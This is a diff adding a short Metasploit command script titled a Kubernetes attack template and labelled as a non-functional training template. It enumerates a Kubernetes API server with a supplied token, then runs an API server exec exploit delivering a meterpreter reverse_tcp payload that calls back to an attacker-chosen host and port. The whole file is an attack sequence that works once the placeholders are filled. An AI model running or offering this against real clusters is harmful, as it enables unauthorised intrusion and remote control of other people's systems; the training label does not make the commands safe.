@@ -1,0 +1,17 @@
+# Kubernetes Attack Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/kubernetes/kube_enum
+set RHOSTS <TARGET_IP>
+set RPORT 8080
+set TOKEN <K8S_TOKEN>
+run
+
+use exploit/linux/http/kubernetes_api_server_exec
+set RHOST <TARGET_IP>
+set RPORT 8080
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set TOKEN <K8S_TOKEN>
+exploit
